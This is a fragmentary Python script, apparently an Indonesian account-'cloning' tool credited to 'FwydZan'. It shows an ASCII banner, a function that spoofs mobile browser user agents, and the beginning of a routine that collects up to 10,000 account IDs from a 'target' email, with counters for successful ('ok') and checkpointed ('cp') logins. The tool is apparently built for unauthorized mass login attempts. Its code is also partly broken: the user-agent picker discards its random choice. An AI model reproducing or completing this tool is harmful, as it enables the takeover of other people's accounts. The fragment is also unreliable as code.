...
def logo(n):
 ...
 selamat datang {kk}{n}{P}, script by {kk}FwydZan{P} limited user""")
def logo2():
	return str(f"""  _   _ _______  _______    ____  _        _    ____  _____
 | \ | | ____\ \/ /_   _|  | __ )| |      / \  |  _ \| ____|
 |  \| |  _|  \  /  | |    |  _ \| |     / _ \ | | | |  _|
 | |\  | |___ /  \  | |    | |_) | |___ / ___ \| |_| | |___
 |_| \_|_____/_/\_\ |_|    |____/|_____/_/   \_\____/|_____|
 selamat datang {kk}user{P}, script by {kk}FwydZan{P} limited user""")
...
def ua_rozh():
	rr = random.randint
	rc = random.choice
	A = f"Mozilla/5.0 (Linux; U; Android 10; en-US; SM-9005 Build/QKQ1.200315.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/78.0.3904.108 UCBrowser/13.3.2.1303 Mobile Safari/537.36" #ANDROID UCB
	B = f"Mozilla/5.0 (Linux; Android 10; SM-9005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.83 Mobile Safari/537.36" #ANDROID
	C = f"Mozilla/5.0 (Linux; Android 10; SM-9005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36" #ANDRID YANDX
	D = f"Mozilla/5.0 (Linux; Android 10; SM-9005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.80 Mobile Safari/537.36"
	E = f"Mozilla/5.0 (Linux; Android 10; SM-9005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.152 Mobile Safari/537.36" #ANDROID ORERA MINI
	F =  f"Mozilla/5.0 (Linux; Android 10; SM-9005) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36" #WINDOWS OPERA
	baz = rc([A,B,C,D,F])
	tz = f"Mozilla/5.0 (Linux; Android 10; SM-9005) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/87.0.4280.141 Mobile Safari/537.36"
	return tz	
...
def clon_email():
	...
	global ok , cp
	print(f' [{hh}>{P}] dump dari email, max 10000 id')
	nama = input(' target : ')
	if ',' in str(nama):
